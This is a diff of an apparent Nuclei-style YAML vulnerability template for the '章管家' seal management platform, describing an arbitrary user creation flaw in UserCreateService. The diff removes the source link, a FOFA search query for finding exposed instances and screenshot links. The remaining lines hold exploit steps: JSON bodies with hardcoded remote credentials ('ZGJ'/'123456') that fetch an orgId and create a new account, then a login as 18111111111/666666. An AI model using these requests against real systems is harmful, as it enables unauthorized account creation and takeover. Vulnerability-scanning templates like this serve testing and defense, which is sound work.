@@ -3,12 +3,8 @@ info:
   name: 章管家UserCreateService存在任意用户添加漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xgbwttn28w4mmgik'
+  description: ''
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xgbwttn28w4mmgik
-    fofa: app="章管家-印章智慧管理平台"
 http:
 - raw:
   - '1.获取orgId
@@ -42,7 +38,6 @@ http:
 
     {"bimRequestId":"1","bimRemotePwd":"123456","bimRemoteUser":"ZGJ","bimUid":"0","fullName":"123","orgId":"1","loginName":"123123","bimposition":"123"}
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1751640785184-a784974b-58da-4dfa-b4bf-15a2dc3c20aa.png)
 
     2.通过上一步获取的orgId添加用户
 
@@ -76,7 +71,6 @@ http:
 
     15. {"bimRequestId":"1","bimRemotePwd":"123456","bimRemoteUser":"ZGJ","bimUid":"0","fullName":"123","orgId":"xx","loginName":"18111111111","bimposition":"123","__ENABLE__":"true"}
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1751640785487-6c98ba26-7eff-49b7-9208-b99f8860b102.png)
 
     1. 用账号18111111111/666666成功登录系统'
   redirects: false
